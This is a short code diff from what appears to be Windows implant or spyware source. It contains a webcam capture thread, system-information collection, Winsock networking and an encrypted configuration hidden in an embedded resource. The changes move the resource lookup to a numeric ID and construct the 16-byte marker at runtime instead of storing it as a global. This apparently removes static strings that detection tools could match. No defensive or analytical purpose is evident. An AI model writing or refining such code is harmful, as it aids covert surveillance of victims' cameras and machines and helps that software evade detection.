@@ -138,7 +138,7 @@ void camera_thread(void* arg) {
 }
 
 void load_config_from_resource() {
-    HRSRC hRes = FindResourceA(NULL, "CONFIG_RES", RT_RCDATA);
+    HRSRC hRes = FindResourceA(NULL, (LPCSTR)101, RT_RCDATA);
     if (!hRes) return;
 
     HGLOBAL hData = LoadResource(NULL, hRes);
@@ -148,8 +148,10 @@ void load_config_from_resource() {
     DWORD dwSize = SizeofResource(NULL, hRes);
 
     if (dwSize >= CONFIG_RES_SIZE) {
+        unsigned char marker[16];
+        SET_MARKER(marker);
         // Double check marker to ensure we're at the right spot
-        if (memcmp(pData, g_config_marker, 16) != 0) return;
+        if (memcmp(pData, marker, 16) != 0) return;
 
         size_t plain_len;
         // Skip the 16-byte marker at start of the resource
@@ -173,10 +175,10 @@ void load_config_from_resource() {
 }
 
 int main() {
-    load_config_from_resource();
-
     WSADATA wsa;
     WSAStartup(MAKEWORD(2, 2), &wsa);
+
+    load_config_from_resource();
     g_send_mutex = CreateMutex(NULL, FALSE, NULL);
 
     char* info = collect_sysinfo();
